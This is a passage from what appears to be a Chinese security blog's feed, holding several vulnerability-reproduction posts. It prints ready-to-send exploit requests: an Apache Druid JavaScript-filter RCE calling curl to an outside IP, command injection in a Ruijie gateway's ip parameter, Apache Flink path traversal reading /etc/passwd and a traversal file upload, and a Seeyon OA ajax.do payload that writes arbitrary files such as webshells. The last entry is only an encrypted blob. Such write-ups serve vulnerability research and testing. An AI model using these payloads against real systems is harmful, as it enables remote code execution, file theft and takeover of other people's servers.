class="headerlink" title="改成"></a>改成</h5><pre><code>&#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;curl xx.xx.xx.xx&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338142733.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338685632.webp" alt="image"></p><h3 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h3><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338755741.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612338778844.webp" alt="image"></p><h2 id="最终poc-为"><a href="#最终poc-为" class="headerlink" title="最终poc 为"></a>最终poc 为</h2><pre><code>POST http://xx.xx.xx.xx/druid/indexer/v1/sampler HTTP/1.1Host: xx.xx.xx.xxUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/jsonContent-Length: 1103&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https://xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;url xx.xx.xx.xx&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
            <tag> Apache Druid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>锐捷网关RCE </title>
      <link href="2021/02/03/%E9%94%90%E6%8D%B7%E7%BD%91%E5%85%B3RCE/"/>
      <url>2021/02/03/%E9%94%90%E6%8D%B7%E7%BD%91%E5%85%B3RCE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自己搭建好测试环境"><a href="#自己搭建好测试环境" class="headerlink" title="自己搭建好测试环境"></a>自己搭建好测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612322342932.webp" alt="image"></p><h3 id="漏洞文件"><a href="#漏洞文件" class="headerlink" title="漏洞文件"></a>漏洞文件</h3><h3 id="guest-auth-guestIsUp-php"><a href="#guest-auth-guestIsUp-php" class="headerlink" title="/guest_auth/guestIsUp.php"></a>/guest_auth/guestIsUp.php</h3><pre><code>&lt;?php    //查询用户是否上线了    $userip = @$_POST[&#39;ip&#39;];    $usermac = @$_POST[&#39;mac&#39;];    if (!$userip || !$usermac) &#123;        exit;    &#125;    /* 判断该用户是否已经放行 */    $cmd = &#39;/sbin/app_auth_hook.elf -f &#39; . $userip;    $res = exec($cmd, $out, $status);    /* 如果已经上线成功 */    if (strstr($out[0], &quot;status:1&quot;)) &#123;        echo &#39;true&#39;;    &#125;?&gt;</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="列出poc"><a href="#列出poc" class="headerlink" title="列出poc"></a>列出poc</h3><pre><code>POST http://127.0.0.1:9000/guest_auth/guestIsUp.php HTTP/1.1Host: 127.0.0.1:9000User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; sysmode=sys-mode%20gatewayDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 45ip=127.0.0.1|echo 1231231 &gt;111.txt &amp;mac=00-00</code></pre><h3 id="发送poc"><a href="#发送poc" class="headerlink" title="发送poc"></a>发送poc</h3><p>  <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612322111995.webp" alt="image"></p><h3 id="验证结果"><a href="#验证结果" class="headerlink" title="验证结果"></a>验证结果</h3><p>  <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612322433963.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> rce </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Flink CVE-2020-17519  CVE-2020-17518</title>
      <link href="2021/02/03/Apache-Flink-8/"/>
      <url>2021/02/03/Apache-Flink-8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h2><h4 id="搭建好测试环境进入flink"><a href="#搭建好测试环境进入flink" class="headerlink" title="搭建好测试环境进入flink"></a>搭建好测试环境进入flink</h4><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612318501808.webp" alt="image"></p><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><pre><code>    https://xx.xx.xx.xx/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612318543434.webp" alt="image"></p><h2 id="CVE-2020-17518"><a href="#CVE-2020-17518" class="headerlink" title="CVE-2020-17518"></a>CVE-2020-17518</h2><h4 id="直接复用poc"><a href="#直接复用poc" class="headerlink" title="直接复用poc"></a>直接复用poc</h4><pre><code>POST /jars/upload HTTP/1.1Host: xx.xx.xx.xxAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeContent-Type: multipart/form-data; boundary=--------721072898Content-Length: 151----------721072898Content-Disposition: form-data; name=&quot;jarfile&quot;; filename=&quot;../../../../../../../../tmp/test.txt&quot;testtest----------721072898--</code></pre><p>   <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612319702839.webp" alt="image"></p><h4 id="测试是否上传成功"><a href="#测试是否上传成功" class="headerlink" title="测试是否上传成功"></a>测试是否上传成功</h4><p>  <img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1612319749301.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> CVE-2020-17519 </tag>
            
            <tag> CVE-2020-17518 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远ajax.do 任意文件上传</title>
      <link href="2021/01/08/%E8%87%B4%E8%BF%9Cajax-do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>2021/01/08/%E8%87%B4%E8%BF%9Cajax-do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="漏洞影响范围："><a href="#漏洞影响范围：" class="headerlink" title="漏洞影响范围："></a>漏洞影响范围：</h2><pre><code>致远OA V8.0致远OA V7.1、V7.1SP1致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3致远OA V6.0、V6.1SP1、V6.1SP2致远OA V5.x致远OA G6</code></pre><h2 id="自己搭建好测试环境"><a href="#自己搭建好测试环境" class="headerlink" title="自己搭建好测试环境"></a>自己搭建好测试环境</h2><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1.webp" alt="image"></p><h2 id="复测过程"><a href="#复测过程" class="headerlink" title="复测过程"></a>复测过程</h2><h4 id="验证是否存在漏洞漏洞文件"><a href="#验证是否存在漏洞漏洞文件" class="headerlink" title="验证是否存在漏洞漏洞文件"></a>验证是否存在漏洞漏洞文件</h4><pre><code>http://192.168.1.18:8080/seeyon/autoinstall.do/..;/ajax.do</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1614307043(1).webp" alt="image"></p><h5 id="出现-“出现异常：java-lang-NullPointerException-null-”-则存在漏洞组件可能存在漏洞！"><a href="#出现-“出现异常：java-lang-NullPointerException-null-”-则存在漏洞组件可能存在漏洞！" class="headerlink" title="出现 “出现异常：java.lang.NullPointerException:null ” 则存在漏洞组件可能存在漏洞！"></a>出现 “出现异常：java.lang.NullPointerException:null ” 则存在漏洞组件可能存在漏洞！</h5><h4 id="使用poc进行漏洞利用"><a href="#使用poc进行漏洞利用" class="headerlink" title="使用poc进行漏洞利用"></a>使用poc进行漏洞利用</h4><pre><code>[&#123;&#39;formulaType&#39;: 1, &#39;formulaName&#39;: &#39;test&#39;, &#39;formulaExpression&#39;: &#39;String path = &quot;../webapps/seeyon/&quot;;        java.io.PrintWriter printWriter2 = new java.io.PrintWriter(path+&quot;文件名.txt&quot;);        String shell = &quot;需要上传的内容base64编码放入此处&quot;;        sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();        String decodeString = new String(decoder.decodeBuffer(shell),&quot;UTF-8&quot;);        printWriter2.println(decodeString);        printWriter2.close();&#125;;test();def static xxx()&#123;&#39;&#125;, &#39;&#39;, &#123;&#125;, &#39;true&#39;]</code></pre><h4 id="修改好上述poc-内容后进行gzip加密后再进行url编码即可得到漏洞利用数据"><a href="#修改好上述poc-内容后进行gzip加密后再进行url编码即可得到漏洞利用数据" class="headerlink" title="修改好上述poc 内容后进行gzip加密后再进行url编码即可得到漏洞利用数据"></a>修改好上述poc 内容后进行gzip加密后再进行url编码即可得到漏洞利用数据</h4><h3 id="加密与利用过程"><a href="#加密与利用过程" class="headerlink" title="加密与利用过程"></a>加密与利用过程</h3><h6 id="将需要上传的内容进行base64编码"><a href="#将需要上传的内容进行base64编码" class="headerlink" title="将需要上传的内容进行base64编码"></a>将需要上传的内容进行base64编码</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/23234234.webp" alt="image"></p><h6 id="替换poc内String-shell内容-修改上传文件名"><a href="#替换poc内String-shell内容-修改上传文件名" class="headerlink" title="替换poc内String shell内容 修改上传文件名"></a>替换poc内String shell内容 修改上传文件名</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84poc.webp" alt="image"></p><h6 id="进行gzip与url编码"><a href="#进行gzip与url编码" class="headerlink" title="进行gzip与url编码"></a>进行gzip与url编码</h6><pre><code>在线加密工具https://ailiqun.xyz/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B.webp" alt="image"></p><h6 id="最终得到利用数据包为"><a href="#最终得到利用数据包为" class="headerlink" title="最终得到利用数据包为"></a>最终得到利用数据包为</h6><pre><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1Host: 127.0.0.1Connection: closeCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9loginPageURL=; login_locale=zh_CN;Content-Type: application/x-www-form-urlencodedmanagerMethod=validate&amp;arguments=进行gzip与url编码后的poc内容</code></pre><h6 id="使用burp发送数据包进行漏洞利用"><a href="#使用burp发送数据包进行漏洞利用" class="headerlink" title="使用burp发送数据包进行漏洞利用"></a>使用burp发送数据包进行漏洞利用</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F.webp" alt="image"></p><h6 id="利用成功"><a href="#利用成功" class="headerlink" title="利用成功"></a>利用成功</h6><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/%E9%AA%8C%E8%AF%81.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 致远OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密杂项</title>
      <link href="2020/11/02/%E6%9D%82%E9%A1%B9/"/>
      <url>2020/11/02/%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抽根利群冷静下再想想！" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="72dfd1b1e2796b6bd1eed03d7f6d0930063beb2d9af8c43766c82c5a0d90a47d">09f7e28a2ee5cc0acb1a500e2b9fb1297435f08653cb47d2da75f53c9bdce32a16820912d1844e581a03f7cbba597a45bf7bdc57409694c6d8c79ef9a4efe06d7ee82643d7b01df0e7a71a79f6ab8add1df932970bb02bb798a97619626611f011a1c34b36c23234ab5b3e45d4e9ab57de159197a7a92bf982667afb86f4c7bee3dd681cdb254e975500a94c9b70865ac4996bfd67752fac9d36c928d050773fde5202e9f34bd270c79cca1d74906a7dd0562d11b076e10d263b941a9b7443447f3dc7a1a0978802cb3d3fe1ccacdf347e589fb1e0085b83659304cb517cc9ee350c3e8fae2f3e5a84e5e5eadc1df07c240516e36938409ba23aad04fd8286cf1e299d13cc9bd66773ba2a03a5155828384c16da7409cf9f96323a417511dfefa01823c2b519f0898bef3a17e955d8b387a0861b19d40c5466ee3e901fd12a3cf35b11a19b9a8ef634124f5b7db4ff861707c689ba944a64a5e19865f4fb2719e401de424c8af20d41126272fc98d4df21d3c0e62defdf1a856f8e26afdf3fa0b8e790ef7263310ed6baf7478a68771fc9794ee807877c491e9f4613792387a817bf9132722f551a2fa828862d547530ae497fc734c1caebf31751fc4e215881a72fccee57ac54b4beb79889b8c324ac564b8ee0d5b9984ac9b97b6ac7d46961131e4610b3122d357b756da2895c7105ca97eb51c3893e8be32be6f9f24e520d24742a5f6286a0a3526a6dd70c24191f6b53eb1741d2e8f39566e7f71fe00555e3d21a5889b1f6c03631f01171b85cf9ade976de62d251f9eb7242e734da6f7bc1db98b0561ee2dbcccd440ab73957a0c61d4deaeffa72f91a08e211e56db86bf2b7ecb1b5a4d92a1010ea4762431242deec1797f154e87942049c765596c57486c462f59bc40842556d2930283aadbc63a02e45259966e32ef32624240599d24d32e90f5bd6a3c699a4d7a5587dbb3fdec4c7da686790d7df0e3bff0aacc6a6fec7ca2211b3ddda0916183e2b014c0bdcbd82394e34f44f59c747aadc8c1f5e60c554f640869520f9d7677b3f64a926ba246d02633f51c3d6c5cf58a46a67dffec555973ee54dc877867cceaf17fa3c4f13e12e7c2af6934db22632a1243eabdb69bb691d6de16a2ae222335808e4cfcc7a07c0caad9bd61dcfa2f00a75ec8cdb6bee7d5b88213aa6a6793d8f4f7736114d1d2d5facd13cdb2e634a581d9ae5b83f7bb2d6c71fe7bd3d4086631ca5fc1db22f4dfc47423b6337a7c11cba3d2fb3f590a61c99c2cc85e16c3a665a49d36988f0da46bc7f729b4d5b6be5364e2218023ca8fdf213af53d64fd840819e283a0b26fd5ef709914916bfe026122b0dabc4b475f81c4c6f4fe8d03fb0a37667cfe20f8dde4e8346e937ccb61371e729eb7704ca5658bbc4b5e18741ec5f52c709b8d79821d3bb12abc583b00b6a2a5c8414aea00696d8d4afd842103720f4f982bc20fa0a48703dccbdea55e09b05629ab7c42be2fdc4ec86abe43e31ad4b7c0b2614bb2e8580ca4a4350e02a14460be4d11c794c898c5576ec1c608f7d10ffbb916e32d7cdc05e2334d8af537c8e3046ab339bbf1aa858c07bfd9c74904eb561faf03a0d9e4de04a0fa899ba8b8ebd0a2c5f7e5526079271fbe459c22cd7afc3d1097c3dd1297dc1d0d9203b9756832df63eab0b9957fdcd2238ae72b59f1c697da2b35e346113394e4559b925bb6acaafdffec745c3283077de141aa4d75383227b22abca16db168de82c23065c4f3d24c813d53d60351578e96f948a75d23285c931b333e9d17f61a758eafe1ea0a87734296941b34d08d0ba576ab9628a80681c4890651f1d69dc2406086b39a2a69379848b4df511ad6d362e37d290f4a62c53ea66d7e11d90bb4a424590b26d1c9f1704f60686f789c74f9ccb403fad70e23bac160ad89dd69d3aad92f79ad3f0b4f8924518e8874f374ee8aa902b62aa8b3ae402624c3fca0c04d2aaef972a0db2012b06907a0b68ce6a2eb03e826546f3ede30d88f8aed9912931c9f6a30a128789b3e93fd4c92a36723e23254bc29527c6bd0c6e6ddb4bad9d2fa8e4b2c03e9472bedb4de3699c564e8fb71b67a00ec2c6bcfa18cf9e642d306eb50ff7210d9ef3f78ece40ceccd53fbb638070a1a789279cd2cdf52b9f18bac40502d3111657761823fac524511fde5a8f0b6a9f92bb1152d3f4894d5f6cd15a32748236c91d6a6e7c2a867bb4e416ee977ec6adf5aeac257d729f9c93f0cdf67fd72779537ef200e769507bb1dfec6c8f9016ebfd92ebf0fcb87bfa97933ad816af342704567db7150d4b86f7be9a74619abf1d2de68da026f3e1da8c7f0ef9ff9e33ae239ff1a24f1cf4d375def9a99a6c84710eb696f3e4085406ee8c1d8e02307649361f566fd3dc8aac3e3b6248ce30819dd66d123e8584e07a4692526e8cd40a35eb47b1951b9bf3246893f59a389b3052cb6f142f18ded1fa43dcd6bb5a0260ecba810174f05821ebaf3a4d189511eb73637974c50e889fed4ef33787489792887989a456e3409e43a755d1073ebd26c1bc5b11299d1be96349f19aeeb65d8ac0f8b68792e774f8a9b8c570ab88c18fd751f8420a4d6e3c46dd647e33e9eb6add71ba680afcc8517081ebc5643eb1d5f884ffe41158d35fb978f2360f10b057b60f4925595662cf2ee58e23f15abf5c75b9b560d0d580f8998148b29f0f417b16fe67774badd654c4c8e3e34553de1e0425e5708b98c0e1f3665f48fed8ce06fe38981b95dc6159debfea23a2a83380ee48f4ed1ddf9eab728a57eb28406c41e41ce78b6a28233f93db173f9449058f0502374239e6b731d56aebcca6c35c5ba9c6e34b0ba73e60ba107bd41912c44bcfe663afe2ff1803eb65089e6f333aeee358eaf34e041ad5a684a2970d4b1368fe489e833b9415d430ee7671be2212649378ce0e7cb9b1f303c3af6303526953606965b31ee230e78b8eeecc5336725ad9ffa5b2ecfd6654a2c21a6078539afc2376759267f43467538a645ec12cff36d9a7977df41d6a985335561818b49b5367d9ad6bf05f222a426a11cb3766c6587709653f7b95e18c64f171f93ea3dbb41d503185d2645c31de65dafd028ac8bfd77fa7435ddae7d721a5632a67fd0b18ba1329d0fded18e40b7b2974a7838a22e9d709c2ea1ed8859d385eb87927c4e4d0172f7501abfc19a6c6a1786154b20bd83049d9fbea2a7c82334907c98eda37b5f649a0122e6d84642aa0cdf3f9358a2401c3488c7dd5eac10c42bcc7817e2c004621fc1bef5b428af347d104ad060785f57c8371440e338bd1920ba0dea4710c382c0ac0f006b531a378e20d4e51be1db1568dcd35cc2ffe74bdac52b033a436d2b72df3b3667f4bdd0dd9e1209dfc6fd92adc318f0a21d2371cdb9b8ef3e93b20461f86215f0a39a8d294d1bff4b5db0c82493545e4b1e319f2815b7578c7824d7e160903c320ab5d4019dd92d0c73e43578272d022a519e4d61357c60869fb78564cc87babcdddff4285205017af433d5a950d5a3eef0afad16603d0cdf5508a72617ee1bfece511e0656419bdda0b0214a3b91e7000aeb7198dd8cde4c1e4616943e91ecd8fa7c2127e4eb02edaa5488558918499c5d104eb6d8af10e26c0bbca9d9e60029bb2d14d03283603669535cbf430bd7504746fc8ccb58d41f90fdcb9ce7c3e624972d643da88c52ccd047e4f2c958fa1914c1f65d098544459c593213d60f7a078085c8b847dcf83e13971081471371c25687267a875d1f6fd538b55be2a9f95975ad05f1ce10e766f6a0fdd7f14757d55325d4a93610ad9134da3f09fadc6351df1bf94ae63ea46781f9e1241681a500bcf7f41804a6c3dbc3e9a8216a6018c5c5965e55c8d3270fbf91c7c1f307c715d88a6386aa272a13c3cafd56bba1d36192d39f64cf7893c391ddd1b93c35979d151b33871bbee44b072fdfae2b8cdf3c03cead78e500503771110ded2d777bacf1dc2be01fcd15ff3f953c7e8fe338238727577c72ae993082703b903987514056043b528de5db81f858dd905d62226b8f430b200c1b2a7cb2ece1ddd76c11f54b1a45a68e08f2dc6b65afcda6fdcf2a338f0bf8a286392894fb858c8acb8ebd058b5e0bf02287c369de7808cc2d9b33f6bcbf60df23bec669472eb8fbe335e05c021de7a055ee9bb935a2b886d40775cff6625c0cf1a607666317912c77e2a824a59577c13a18d839517833a07de108f6f6cb086725a4872591d7132795898b9c898e58c60c0d9cde9e7d84bce199f8c1a6ad5a41d332fea39b0bf7bae6928ba2e6262aa1e572f022e1cebaab5ee601bdc3b5bfeae311c43eca821728aa14ca2a05aa45d563ddc5b78abd0d1431c41c9cac10e3861b35d459abc4a15ecd5116b1a8f9b60826412cebe1250f12f9bc479314f0d36bfb8bd52a6e805b97fa1ce420b22548ed077f3a97c8de78b8b9bfe1f7377abbc3c00de40b7fd3326caa4d3cd0a24bcec1eeddbfedfdf3b99b69a5dde8443740e81cd5aede52a040451ca8cd9c0821b1d2b36454b11658654dbd6e56765a06f13b2bad4a12ca57eb81d24eb3e01f6c489cb856fa344bd27f82ace152f6f02d764090e04aab66a3ac3a63ba25ebf16ec64d3c7c2ee3e79904257e26d3e992851438ff472c8d3ebf98b90bbcaae091179554390026b81048ab4fceac23bb3b39a1c35d2604753ea37b82e8f75298e62116ad9f97e76ddc8e604a803211685b83883af9ce91eeb54021bbe307786426c45f1719a90c5b31fc4a5cf800dc7a9257fdbf412193642d82284ad63239aacaf980689383e1c47531b106b7c0ae2b1253f0dbb31646d88b6591828849eb67d2da55f7de10a978395a734fb750a0b8d941a54ea607fddd34abee2f79dc207b2cd00e456c446417deb8815fd03dc9b00e2b54640fe63a765f838929649a22450110f601f07e17a9f4d25e68000a799349b77708f6c1e33f9eae5a0d3dc63515f66c8d52466327b03cb9fe5631a43ca5d8f755fc4e0e7377233c4dd42a76974d874c47216563eb79dacdaed6b971aa327b31abe3b4f37843aeaa0f5c17febb70100927d975eaf1865111b4e1b0b786dbc68f5a5449c5b69f112f8abd8a15bc33bd1373489a0cb2c70893636fb4814a2427957fb26e166e5b5bca52d6f2f566f82e2933b372b813b72c3b820fb885bc77a664d0784ae456dc5cb54cbbba9dd1808afc97a23438f97350645b86ba61840ad73c249fcb4775145bd7a884d3b211fc9436fdea001b39da577a33d47d82f6472543f59179240013e22d58588881358f3e04fa6a73024e1663e8432dff4706f5c98cae233042314abe730dc9dfb23186acc4d2cd474b1938327fc805d18d24b4f82ef373e34ff82c3cf9750700dc6a0ce53dfd862911b47ace484ce3e938b2bdc8ac47e05e345a47fa90192787a0cb82fe2e384b328d6b7e3899dc339c5c52bad39bea6245edff307c20b29722315c1ce46488514c943d2e417f2fc7c47d6fd471cb9c2d78b793a12f3d8981619386e7edc8107b10a5f4a721a8eb90c98c0fd44943930c775e4d412cc61f7fb6af0f826aba8972b4328b35cad0af3737147cf87f8d1c6a09b0eb03e9f155831766d99d6fc83846d45311d26fe3dc4e06276bb3adc0674f141446971f96f445ff5f7cdbaf377ef15130813eed3c35f820248deced26493506d9a0ac9f8f78ee60ae4a9d195659f20af17a722b2b1644fd9739a7ba321a2d78dc7b29143216c3cdcdfe0703b8e10be2f895bf039bb5bf9e62668d9f11c31a176820f7e2f34c0d53b86c9bfbd9e9f74ff7065f4dd19d23317b47dd96e8e802593857bb8fbe74c54c7e7b6d7a009bc1625a002489ddb6d81ae8a5d3dc6d76e5794a0eece0681872aadc0bb00fa0eff44a1d4a6f8a4898d658e09b1aff5d9b1b063242e806410403b3489f62227ee4fe1ad5eba43334300245c790adf9790c02cafdb278a38f1f4ca8eeaed89fbb5b33a163f6a1eb1bf72e99d68ce7d7ecb79ed568db4d68114dcb1983fa6aa236e05d4ffabe0a11591274565d7f9a15b63790696fafcee3354ba6938b97dca3625150057364d7deceefc05ec2ea0c40ccdcd8da873e6b2d66ae51bde112f56aba8d05c7e6db273aa5ddde1d43c4ecb7fe66d67d84e275ff80e790b8335d5ad2a158dd378e170e4c3a3c2f3ccc619c3b6f9ea95490c9f7941b4735be1b24a8de7877945396600096cc9648930d9e093faa2a5102356eb5a15b3c7c5e5196cae8775369288ad99841dbc716af979a6fd8ff750a6654188c48372e71eb44b2f787a758cb5312e298e58a46e634b7d6013b7890befb6d9b8b9e60d2c0b02af349f49773472065d5a9c57cb2e7720ee0d43e60de1ad8c3928bce883f2b9bdba91d88d8b4d050d4c279b8a1dda1a2b9942d27077eb51d64714fcbfa1fc64e6e8cc9d8d1ff7fd7dde63f55e4c19cc5a803cba8074364f6ba3f3273e344486d0aa774253a93ecde0efcf5db68dd17551e3f9bd0dc4aa3b487d46cd240002b4f07da89fa363ab4342473b2d29e2d71f9f0446dcfacf473fe94cdd8562c6c0f37aa77b39b8c8b45f0dc85b7878b9b66d3d4317bbcd912369ae506e1410f08b3fb5557a95d31294865d21aa3d5c0b14e5b5ef6a06339c03bcb2e3ac6c41e5a9eec14dfc010f49d1739f9c5836969fceda0139d4b3c74ea09b221b7170fc625ec7cb43fe8c7cbde4ab7d8511a8bcf7a21f5aa26fbf132ae07a98faa50ad90ae8273f56663977d9e6cec83ca6bc8297a9a4c5afd9f234c77d7bf305ccb44572cc6e1e9e69452728bf5fd1257c3e0521584598995eec202f9ad614946da5e14c7c80f241b2f3ec6e2c39d86314c76b9b4ca1368fa5e4e7c9edb73de9ba86005bbdfad3c70b416c13b327ba6641b3a9ce0a7ef3ce86c64b884220cb4bc4fdc46dc1a7be00be68d610513441aa0742fdb29a4a82209550a429676d81a7addd6929a33c241acd19a888245f676efac416f6465755ac5653